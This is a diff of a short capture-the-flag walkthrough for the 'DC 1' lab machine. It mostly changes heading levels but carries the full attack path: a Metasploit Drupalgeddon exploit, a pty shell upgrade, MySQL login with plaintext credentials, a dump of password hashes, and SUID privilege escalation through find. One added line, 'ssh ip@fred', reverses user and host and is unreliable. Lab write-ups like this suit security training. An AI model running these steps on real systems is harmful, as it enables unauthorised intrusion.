@@ -1,6 +1,6 @@
 # DC 1 Walkthrough
 
-## Exploiting Drupalgeddon
+### Exploiting Drupalgeddon
 
 ```sh
 msfconsole -q
@@ -12,7 +12,7 @@ exploit
 python -c "import pty; pty.spawn('/bin/bash')"
 ```
 
-## Retrieving the First Flag
+### Retrieving the First Flag
 
 ```sh
 cat flag1.txt
@@ -39,17 +39,10 @@ array (
 > Brute force and dictionary attacks aren't the only ways to gain access (and you WILL need access).
 > What can you do with these credentials?
 
----
-
-## Accessing MySQL
+### Accessing MySQL
 
 ```sh
 mysql -u dbuser -pR0ck3t -h localhost
-```
-
-### Extracting Hashes
-
-```sh
 SELECT name, pass FROM users;
 ```
 
@@ -58,15 +51,10 @@ admin | $S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR
 Fred  | $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg
 ```
 
----
-
-## Navigating to Home Directory
 
 ```sh
+ssh ip@fred
 cd /home
-```
-
-```sh
 cat flag4
 ```
 
@@ -74,7 +62,6 @@ cat flag4
 > Can you use this same method to find or access the flag in root?
 > Probably. But perhaps it's not that easy. Or maybe it is?
 
----
 
 ```sh
 find / -perm -u=s 2>/dev/null
@@ -83,8 +70,6 @@ find /dev -name null -exec /bin/bash \;
 cd /root
 cat thefinalflag.txt
 ```
----
-
 ## Final Flag
 
 **Congratulations!**
@@ -92,4 +77,4 @@ cat thefinalflag.txt
 > Well done!
 > Hopefully you've enjoyed this and learned some new skills.
 > You can let me know what you thought of this little journey by contacting me via Twitter - @DCAU7
-
+---
